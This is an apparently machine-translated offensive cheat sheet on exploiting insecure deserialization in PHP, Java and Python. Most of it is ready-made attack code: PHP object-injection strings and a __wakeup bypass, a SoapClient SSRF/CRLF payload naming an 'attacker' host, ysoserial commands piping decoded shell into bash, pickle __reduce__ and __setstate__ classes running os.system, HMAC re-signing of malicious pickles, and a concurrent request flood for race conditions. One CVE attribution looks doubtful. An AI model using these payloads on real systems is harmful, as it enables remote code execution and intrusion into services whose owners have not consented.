# Deserialization exploitation chain manual

## PHP Deserialization

### Basic concepts
```php
// Serialization
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// Deserialization
$obj = unserialize($s);

// Magic method trigger chain
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### Common Exploit Chains

#### 1. __wakeup Bypass (CVE-2017-12944 / PHP < 7.4)
```php
// When the number of attributes exceeds the actual number of attributes,__wakeup Do not execute
O:4:"User":2:{...}   // Normal
O:4:"User":3:{...}   // Bypass __wakeup(Attribute Count 3 > Actual 2)
```

#### 2. __toString Trigger
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// Construct.: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. SoapClient CRLF Injection (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// Trigger after serialization SSRF + CRLF Header injection
echo urlencode(serialize($client));
```

#### 4. PHP Serialization length manipulation.
```
// Exploit string length differences
// s:5:"admin" (5 Bytes) vs s:5:"admin" (May have inconsistent lengths after modification)
// Truncate or inject by changing the length value of the serialized string
```

### PHP Deserialization string escape

**increase escape**(Lengthened after filtering):
```
// filter: "x" → "xx"(1→2, more in each place1byte)
// injection: Fill in the controllable attributes ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
// How many are needed to calculate "x" to make up for the length difference
```

**Reduce escape**(shortened after filtering):
```
// filter: "xx" → "x"(2→1, less in each place1byte)
// Use length reduction to swallow subsequent serialized strings
```

## Java Deserialization

### common Gadgets

| Gadget chain | Influence components | command execution |
|-----------|---------|---------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### Detection method
```
# Check common ports/path
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### ysoserial Commonly used payload
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Python Deserialization

### pickle Deserialization RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# send payload to target
```

### Signature bypass
```python
# If the target uses HMAC sign
# 1. Obtain the signing key (possibly via information disclosure)
# 2. construct malicious pickle and re-sign
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### __reduce__ alternative
```python
# use __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## Race condition exploitation

```python
import requests
import threading

def exploit():
    # The time window between deserialization and validation
    r = requests.post(url, data=payload)
    
# Send concurrently
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
